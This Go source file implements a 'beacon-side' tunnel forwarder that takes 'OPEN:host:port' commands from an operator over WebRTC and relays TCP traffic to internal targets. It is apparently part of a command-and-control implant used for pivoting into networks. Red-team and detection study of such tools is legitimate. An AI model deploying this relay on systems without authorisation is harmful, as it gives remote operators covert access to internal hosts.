package tunnel

import (
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"sync"
	"time"
)

// Forwarder runs on the beacon side. It accepts tunnel open requests
// from the operator (via WebRTC data channel), connects to the target
// internally, and bridges data bidirectionally.
type Forwarder struct {
	OnTunnelData func(tunnelID TunnelID, data []byte)
	OnTunnelErr  func(tunnelID TunnelID, err error)
	mu           sync.Mutex
	connections  map[TunnelID]net.Conn
}

// NewForwarder creates a new tunnel forwarder for the beacon.
func NewForwarder() *Forwarder {
	return &Forwarder{
		connections: make(map[TunnelID]net.Conn),
	}
}

// HandleMessage processes a tunnel message from the operator.
// Message format (simple text-based, no proxy protocol):
//
//	"OPEN:host:port"  — open a new connection to target
//	"CLOSE"            — close this tunnel
//	<raw bytes>        — data to forward to the target
func (f *Forwarder) HandleMessage(tunnelID TunnelID, raw []byte) {
	msg := string(raw)

	switch {
	case strings.HasPrefix(msg, "OPEN:"):
		target := strings.TrimPrefix(msg, "OPEN:")
		log.Printf("[forwarder] tunnel open -> %s (id: %s)", target, tunnelID)
		go f.openTunnel(tunnelID, target)

	case msg == "CLOSE":
		log.Printf("[forwarder] tunnel close (id: %s)", tunnelID)
		f.closeTunnel(tunnelID)

	default:
		// Raw data to forward to the target connection
		f.forwardData(tunnelID, raw)
	}
}

func (f *Forwarder) openTunnel(tunnelID TunnelID, target string) {
	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		log.Printf("[forwarder] dial %s failed: %v", target, err)
		if f.OnTunnelErr != nil {
			f.OnTunnelErr(tunnelID, fmt.Errorf("dial %s: %w", target, err))
		}
		return
	}

	f.mu.Lock()
	f.connections[tunnelID] = conn
	f.mu.Unlock()

	log.Printf("[forwarder] tunnel connected to %s (id: %s)", target, tunnelID)

	// Read from target and send back through WebRTC tunnel
	buf := make([]byte, 16384)
	for {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		n, err := conn.Read(buf)
		if err != nil {
			if err != io.EOF {
				log.Printf("[forwarder] read from %s: %v", target, err)
			}
			f.closeTunnel(tunnelID)
			return
		}
		if f.OnTunnelData != nil {
			f.OnTunnelData(tunnelID, buf[:n])
		}
	}
}

func (f *Forwarder) forwardData(tunnelID TunnelID, data []byte) {
	f.mu.Lock()
	conn, ok := f.connections[tunnelID]
	f.mu.Unlock()

	if !ok {
		log.Printf("[forwarder] unknown tunnel id: %s", tunnelID)
		return
	}

	if _, err := conn.Write(data); err != nil {
		log.Printf("[forwarder] write error on %s: %v", tunnelID, err)
		f.closeTunnel(tunnelID)
	}
}

func (f *Forwarder) closeTunnel(tunnelID TunnelID) {
	f.mu.Lock()
	conn, ok := f.connections[tunnelID]
	delete(f.connections, tunnelID)
	f.mu.Unlock()

	if ok && conn != nil {
		conn.Close()
		log.Printf("[forwarder] closed tunnel: %s", tunnelID)
	}
}

// Close terminates all active tunnel connections.
func (f *Forwarder) Close() error {
	f.mu.Lock()
	defer f.mu.Unlock()

	for id, conn := range f.connections {
		conn.Close()
		delete(f.connections, id)
	}
	return nil
}
